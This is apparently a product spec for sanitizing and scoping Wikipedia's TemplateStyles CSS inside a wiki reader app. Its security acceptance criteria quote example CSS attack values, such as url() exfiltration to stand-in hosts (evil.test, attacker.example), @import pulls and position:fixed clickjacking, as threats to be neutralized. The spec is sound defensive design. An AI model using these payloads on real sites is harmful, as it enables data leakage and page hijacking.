# Spec — Reuse Wikipedia's TemplateStyles blocks (sanitized + scoped), not per-template ports

- **Status:** Ready for the discovery spike, then UX + Dev. **Owner:** Product. **Area:** Article
  rendering (the "Wiki" left column, `.wiki-body`).
- **GitHub issue:** #105 (`type: build`). Subsumes #91 (montage `.tmulti`).
- **Supersedes the *strategy* of:** the #74 structure-keyed CSS decision and the #104 clade-stylesheet
  port — both in `docs/ARCHITECTURE.md`'s "DOMPurify allowlist" entry. Those reached two box shapes and
  cladograms by hand; this replaces "port one template family at a time" with "keep the page's own
  TemplateStyles, sanitized and scoped." It does **not** reopen the strip list, the inline-`style`
  allowlist (sibling Issue B), or the allowlist for non-CSS tags.
- **Inputs read:** the issue body (work outline, in/out of scope, "Done when"); `docs/ARCHITECTURE.md`
  (X4 guarantee, #74 decision, #104 clade-port decision); `docs/specs/wiki-style-reuse.md` +
  `docs/design/wiki-style-reuse.md` (the #104 artifacts this generalizes); `docs/specs/article-fidelity.md`;
  `lib/wiki/article.ts` (the DOMPurify sanitize + `stripChrome`/`prepCitations`/`cleanMath`/`prepClades`
  passes); `test/article-clade-fidelity.test.ts` + `test/article-fidelity-xss.test.ts` +
  `test/article-fidelity-hook-xss.test.ts` (the live X4/clade fixtures these ACs must extend).

---

## 1. Problem

The article column blanket-strips the page's own styling for XSS safety — every inline `style`
attribute, every `<style>` block, and every TemplateStyles module — and then recreates that styling
**one template family at a time**. The history is the symptom:

- **#74** reached the modern infobox and the taxobox with bespoke, structure-keyed CSS in
  `app/globals.css` (Group B) — and explicitly *gave up* per-taxon band colors and per-cell shading
  because those live only in the stripped inline `style`/TemplateStyles.
- **#104** reached cladograms (`table.clade`) by hand-porting Wikipedia's `Template:Clade/styles.css`
  into our bundle, re-scoped under `.wiki-body`.
- **#91** (montage `.tmulti`, drawn by `Template:Multiple image`'s TemplateStyles) is the next family in
  the queue, and it would be the next bespoke pass.

Every exotic template Wikipedia ships — and there are dozens of long-tail TemplateStyles modules per
article (the #104 survey counted 21 distinct modules on the Cat page alone) — needs another bespoke
authoring job before its layout renders faithfully. The root cause is structural: **we discard the page's
own TemplateStyles and then try to recreate them by hand, forever.** This does not scale past a
hand-curated set of seeded articles. The owner names this correctly as a yak shave.

The reason we strip in the first place is real and must not be weakened — the **X4 guarantee** (the
anti-XSS property asserted by `test/article*.test.ts`): attacker-controlled CSS embedded in fetched
article HTML is an attack surface. A crafted `<style>`/inline `style` can exfiltrate data via
`background:url(attacker.example/?leak=…)`, overlay or clickjack the page via `position:fixed`/`absolute`,
pull remote CSS via `@import`, or escape the article column to deface wiki+ chrome. The live clade
fixture (`test/article-clade-fidelity.test.ts`) already encodes this threat verbatim: a
`Template:Clade/styles.css` `<style>` block carrying `background:url(https://evil.test/?leak=1)` inside an
`mw-empty-elt` span. Today we neutralize that by dropping all of it. The product question this spec
answers is: *can we keep the page's TemplateStyles — sanitized and confined — so faithful layout "just
works," without re-opening that surface?*

## 2. User value

A new or unfamiliar article's TemplateStyles-driven layout — cladograms, multi-image montages, hlists,
and the long tail of exotic templates — **renders faithfully, with no per-template CSS authored by us.**

- **The Curious Reader** (the UX persona who lands on a Topic page to actually read the encyclopedia next
  to the clips) sees an article that *looks like Wikipedia*, on any article, not just the few we have
  hand-tuned. The CLAUDE.md promise — "the Wiki article side keeps a faithful Wikipedia look" — finally
  holds for the long tail, which is the whole point of curating *over* Wikipedia rather than reproducing a
  curated slice of it.
- **The wiki+ team / future contributors** stop paying the per-template-family tax. Faithful rendering of
  an arbitrary article stops requiring a bespoke CSS pass, which is the only way article coverage scales
  beyond the seeded set.

## 3. Scope

**In scope** — the `<style>`/TemplateStyles **reuse path** in the article column (`.wiki-body`): how the
page's own `<style>`/TemplateStyles blocks are **sanitized**, **scoped** (confined under `.wiki-body`),
and **applied** to the sanitized DOM, so that the layout they encode renders faithfully without our
authoring per-template CSS. Concretely:

1. Keep the page's `<style>`/TemplateStyles blocks (rather than blanket-stripping them), passed through a
   CSS sanitizer + selector-scoper, and apply the result to the sanitized DOM.
2. Retire the per-template CSS the reused stylesheets now cover — the #104 clade port and the #74 Group-B
   structure-keyed rules — keeping only **thin wiki+ overrides** (the faithful-grey frame, the no-Indigo
   boundary, the responsive stack/scroll). Dev decides the exact cutover.
3. Keep the existing **responsive** behavior (infobox/taxobox stacks full-width below `lg`; wide tables
   and cladograms scroll within a contained region, never widening the two-column shell).

**Out of scope** — do not touch:

- **Inline `style` attributes** — that is the sibling **Issue B**, which depends on this issue's sanitizer
  infrastructure and lands *after* it. This spec is the `<style>`/TemplateStyles *block* path only.
- **The strip list** (`stripChrome`) — which elements are *removed* (navboxes, editor chrome, ambox/
  metadata, sidebars). What survives sanitize is unchanged; this spec changes how surviving styled
  elements are *styled*, not which elements survive.
- **The ＋plus rail / header / reading layout / two-column shell / TOC / citation popover / scroll-sync.**
- **Math** (the SVG-fallback-image mechanism, C4) — unaffected.
- **Non-English / multilingual** articles — English Wikipedia only, consistent with MVP sequencing.
- Re-opening the article column to host video or any in-article wiki+ chrome.

## 4. Acceptance criteria (numbered, individually testable, mechanism-agnostic)

These describe **required properties**, not the implementation. QA maps a test to each; AC6–AC9 (the X4
re-proof) are the security release gate. Wherever an AC names a value (a color, a breakpoint), it is the
*faithful-Wikipedia* value, not an invented one. The fidelity ACs are verified against the live Parsoid
markup of the in-scope articles (Cat for cladograms + taxobox + a `.tmulti` montage; plus a **held-out**
article — one not used during the build — carrying an unfamiliar TemplateStyles table).

### Fidelity (no per-template CSS authored by us)

- **AC1 — Cladograms faithful, no bespoke clade CSS.** `table.clade` cladograms render as legible
  phylogenetic trees — connected branch lines (the per-cell border segments that join into the
  right-angled bracket tree) and stepped indentation, matching Wikipedia's tree shape — and they do so
  **with no per-template clade CSS authored by us** (the #104 hand-port is retired; the styling comes from
  the page's reused `Template:Clade/styles.css`, sanitized + scoped). A cladogram that renders as
  collapsed/borderless nested boxes, a flat list, or with disconnected/absent branch lines fails.
- **AC2 — `.tmulti` montages faithful, no bespoke montage CSS (#91).** Multi-image montage tables
  (`.tmulti`, drawn by `Template:Multiple image`'s TemplateStyles) render faithfully — the images laid out
  in their intended grid/row with their captions — **with no per-template `.tmulti` CSS authored by us.**
  This is the symptom #105 subsumes from #91; if the montage renders as a broken stack of full-width
  images or unstyled cells, it fails.
- **AC3 — A held-out unfamiliar TemplateStyles table renders faithfully with zero new rules.** An article
  **not** used during the build, containing a TemplateStyles-driven table whose template family we have
  never hand-styled, renders faithfully (its layout matches Wikipedia's, modulo our column width) **with
  zero per-template CSS rules added for it.** This is the headline proof that the per-template tax is
  gone: the reuse path covers a template it was never tuned against. If reaching fidelity on this article
  required authoring any new per-template rule, AC3 fails.

### X4 security re-proof for the CSS-block path (the release gate)

The threat model is **re-argued for this redesigned boundary, not inherited from #104.** Each property
below is phrased as a testable assertion against crafted, attacker-controlled article CSS arriving inside
the fetched article body (in a `<style>`/TemplateStyles block in scope here; the inline-`style` variant is
Issue B but the existing inline assertions must not regress). "Neutralized" means: the malicious effect
does not occur in the rendered page — whether the sanitizer drops the offending declaration, rewrites it
inert, or the scoping confines it is the mechanism's choice (AC stays mechanism-agnostic).

- **AC4 — No `url()` exfiltration.** Crafted article CSS that attempts to issue a network request via a
  CSS value — e.g. `background:url(https://evil.test/?leak=…)`, or any `url()`-bearing property — does
  **not** cause that request to be issued from the reused-CSS path. (The live clade fixture's
  `background:url(https://evil.test/?leak=1)` is the canonical case and must be neutralized.)
- **AC5 — No off-column overlay / clickjack.** Crafted article CSS using `position:fixed` or
  `position:absolute` (or equivalent) to place an element outside the article column — over wiki+ chrome,
  to overlay or clickjack — does **not** escape the article column's normal flow to cover the ＋plus rail,
  header, player modal, or any wiki+ control. (The existing `position:fixed` assertion in
  `test/article-fidelity-hook-xss.test.ts` must not regress and is extended to the block path.)
- **AC6 — No remote-CSS pull via `@import` (or equivalent).** Crafted article CSS using `@import` (or any
  at-rule that fetches external CSS) does **not** cause remote CSS to be loaded by the reuse path. No
  network dependency on an attacker-influenced URL is introduced.
- **AC7 — No scope escape from `.wiki-body`.** Every rule that the reuse path applies is **confined under
  `.wiki-body`** and cannot match or restyle wiki+ chrome — the ＋plus rail, the projector header, the
  TOC, the General strip, the player modal, the pinned candidate dock. A crafted selector that attempts to
  reach outside the article column (e.g. a bare `body`, `:root`, `html`, a high-specificity global, or a
  selector engineered to break out of the scope prefix) does **not** change wiki+ chrome. QA inspects the
  rail and header at a wide viewport, at scroll-top and scrolled; a single changed pixel of wiki+ chrome
  fails this AC.

### Visual, accessibility, responsive, build

- **AC8 — No Indigo bleed; AA contrast preserved.** No reused or wiki+ rule introduces Indigo Press color
  or treatment (`brand`/`sprout`/`action`, the hardbox border, the offset shadow, the Indigo fonts, gold)
  into the article column; box frames stay faithful Wikipedia grey. All restyled tables/infoboxes/
  cladograms/montages meet **AA**: body text contrast ≥ 4.5:1, large text and meaningful boundaries
  (cell borders, banner hairlines, clade branch lines) ≥ 3:1, with no information conveyed by color alone
  (a banner's signal survives in greyscale via position, weight, hairline, and heading text). If a
  recovered Wikipedia color fails contrast in our column, ink/border is darkened to pass rather than
  shipping the failing color.
- **AC9 — Responsive containment holds.** Below the `lg` breakpoint, the infobox and taxobox stack
  full-width in the article flow (no unreadable narrow float). Wide tables and wide cladograms/montages
  scroll horizontally within their own contained region; the article body and the two-column shell
  **never** scroll horizontally. Banner rows stay centered and shaded at both breakpoints.
- **AC10 — Build + typecheck + suite green.** `yarn build`, `yarn typecheck`, and the **full Vitest
  suite** are green, including the extended X4 regression tests for the CSS-block boundary (AC4–AC7) and
  the fidelity tests for clade (AC1), `.tmulti` montage (AC2), and the held-out table (AC3).
- **AC11 — No regression elsewhere.** Math (SVG fallback), the citation popover, scroll-sync, the TOC,
  wikilink routing, section anchors, and the no-tables/loading/error states behave as before on the
  previously-verified articles (`Photosynthesis`, `Cellular_respiration`, `Lion`, `Pythagorean_theorem`),
  and a no-tables article gains no stray artifact from the reuse path (loading the page's CSS is a no-op
  when there is nothing to style).

## 5. Success metric

- **Primary (the per-template tax is eliminated):** the number of **per-template CSS passes required for a
  newly-encountered TemplateStyles template = 0.** Operationalized by AC3: a held-out article with an
  unfamiliar TemplateStyles table renders faithfully with **zero** new rules authored. Before this work,
  that number is "one bespoke authoring pass per template family" (#74 → #104 → #91 → …); after, it is 0.
- **Secondary (faithfulness coverage):** on the in-scope sample (Cat's cladograms + taxobox + `.tmulti`
  montage, plus the held-out article), the count of **broken styled elements** — collapsed, unstyled, or
  garbled vs. Wikipedia — drops to **zero** for TemplateStyles-driven layout. The bar is "a reader could
  not tell our cladogram / montage / styled table from Wikipedia's, modulo column width."
- **Guardrail:** the X4 re-proof (AC4–AC7) holds — the safety property is a hard, non-negotiable bound on
  the metric; no faithfulness gain is acceptable that admits any of the four CSS threats.

## 6. Discovery/decision spike — decision criteria

This issue is gated on a **developer spike that runs first** (it gates `status: ready` on the issue).
**Product does not pick the mechanism** — the spike does, and these ACs stay mechanism-agnostic so QA maps
tests to *properties*, not to a chosen library. The spike must:

1. **Pick the CSS-sanitization mechanism** that confines every rule under `.wiki-body` and strips the real
   threats — `@import`, `url()` exfiltration, `expression()`, `behavior`, off-column `position`, and any
   selector that escapes the `.wiki-body` scope. Explicitly **evaluate DOMPurify's CSS handling against a
   dedicated CSS parser + selector-scoper**, and choose. (Note the existing sanitizer already sets a custom
   `ALLOWED_URI_REGEXP` and uses a scoped `uponSanitizeAttribute` hook removed in `finally`; whatever is
   chosen must not weaken those or leak across the shared DOMPurify singleton.)
2. **Record the chosen mechanism + its X4 threat model** in `docs/ARCHITECTURE.md` — superseding the #74
   structure-keyed decision and the #104 clade-port decision in the "DOMPurify allowlist" entry, with the
   re-argued threat model for the new CSS-block boundary (how AC4–AC7 are met) as the source of truth.
3. **Honor the fallback the issue names.** If **no approach cleanly meets the X4 re-proof** (AC4–AC7), the
   spike does **not** ship a weakened boundary: the fallback is to **keep porting per-template (the status
   quo of #74/#104), and record *why* the reuse path could not meet X4** in `docs/ARCHITECTURE.md`. In that
   outcome the fidelity ACs (AC1–AC3) are **not** met by this issue and the per-template tax persists — the
   spike's write-up says so plainly, and the issue closes as "X4 could not be re-proven; status quo
   retained, reasons recorded," not as a partial security compromise. The X4 guarantee is never traded for
   fidelity.

The spike's output (chosen mechanism or the documented fallback, plus the recorded threat model) is the
input that lets `status: ready` be set and the UX + Dev stages proceed.

## 7. Assumptions (recorded from ambiguity, not escalated)

- **A1 — "Faithful, no per-template CSS" is the bar; full per-pixel parity is not required where our
  column is narrower or where the strip list removed chrome.** As in #104's design contract, "modulo our
  column width and the stripped editor chrome/navboxes" is the only license; everything else (branch lines,
  band structure, grid layout, alignment) matches Wikipedia.
- **A2 — The reused TemplateStyles may recover styling #74 deliberately gave up (per-taxon band color,
  per-cell shading) *if and only if* the chosen safe mechanism admits those values without violating X4.**
  If the safe mechanism can carry a trusted, sanitized CSS color value, recovering the taxon-band color is
  a welcome win but is **not** a hard requirement of this issue; if it cannot be recovered without
  admitting an X4 threat, the #74 neutral-grey band stands as the accepted partial. The hard requirements
  are the *structural* fidelity (AC1–AC3) and the X4 re-proof (AC4–AC7) — never a color at the cost of
  safety.
- **A3 — The held-out article for AC3 is chosen by Dev/QA at build time** (any English Wikipedia article
  with a TemplateStyles-driven table from a template family not hand-styled in #74/#104/#91), and is **not**
  one of the build's reference articles. Naming it in the build artifact is sufficient; Product does not
  pin a specific title, so the "zero new rules" proof is on genuinely unseen markup.
- **A4 — `<style>`/TemplateStyles blocks and inline `style` attributes are deliberately split** across two
  issues (#105 here; Issue B for inline `style`). If the chosen block-path sanitizer also happens to
  generalize to inline `style`, that is Issue B's call to consume — this issue ships only the block path,
  and AC4–AC7 are proven for the block path. Existing inline-`style` X4 assertions must not regress.

---

## Hand-off

- **Discovery spike (Dev, next, gates `status: ready`)** — pick the CSS-sanitization mechanism per §6,
  record the mechanism + re-argued X4 threat model in `docs/ARCHITECTURE.md`, or invoke the documented
  fallback. The ACs here stay mechanism-agnostic; the spike chooses the *how*.
- **UX / Design** — produce the design contract for the reused-TemplateStyles article column: the
  faithful-Wikipedia visual target for cladograms, `.tmulti` montages, and the long-tail styled tables;
  the responsive stack/scroll behavior; the AA contrast + no-color-alone treatment; and the explicit
  "no Indigo bleed" boundary (AC8). The #104 contract (`docs/design/wiki-style-reuse.md`) is the starting
  point to generalize, not re-derive.
- **Development** — implement against the UX contract and AC1–AC11 once the spike has fixed the mechanism;
  retire the #104 clade port and the #74 Group-B rules the reuse path now covers, keeping only the thin
  wiki+ overrides; extend the X4 regression suite to the CSS-block boundary (AC4–AC7) and add the clade,
  `.tmulti`, and held-out fidelity tests (AC1–AC3).
- **QA & Review** — verify each AC, with AC4–AC7 (the X4 re-proof) as a hard, non-author **security review
  release gate** mapping tests to each threat property, and confirm no regression on the previously-verified
  articles (AC11). This is the **Heavy lane** — the security review is the gate.
